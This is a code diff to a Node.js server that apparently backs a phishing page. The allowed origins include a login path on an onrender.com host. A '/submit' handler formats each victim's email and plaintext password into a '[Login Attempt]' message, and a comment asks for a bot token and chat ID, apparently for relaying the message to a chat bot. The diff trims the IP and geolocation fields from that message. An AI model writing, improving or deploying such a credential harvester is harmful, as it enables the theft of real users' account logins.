@@ -10,7 +10,8 @@ const PORT = process.env.PORT || 3000;
 
 const allowedOrigins = [
   'https://traveladvisor-o85i.onrender.com/outofplace/dossier/partizan/login',
-  'https://traveladvisor-o85i.onrender.com'
+  'https://traveladvisor-o85i.onrender.com/',
+  'http://127.0.0.1:5000',
    // add all your trusted frontends here
 ];
 
@@ -39,7 +40,7 @@ const locationStore = new Map();
 // === Rate Limiting by IP ===
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 10, // max requests per IP
+  max: 10, 
   message: 'Too many requests from this IP, please try again later.'
 });
 app.use(limiter);
@@ -88,14 +89,6 @@ app.post('/submit', locationBlocker, async (req, res) => {
 [Login Attempt]
 Email: ${data.email}
 Password: ${data.password}
-
-Retyped Email: ${data.retypedEmail}
-Retyped Password: ${data.retypedPassword}
-
-IP Address: ${data.ipAddress}
-Location: ${data.location?.city || 'N/A'}, ${data.location?.country || 'N/A'}
-Coords: ${data.location?.latitude}, ${data.location?.longitude}
-Google Maps: https://www.google.com/maps?q=${data.location?.latitude},${data.location?.longitude}
 `;
 
     // Replace with your actual bot token and chat ID
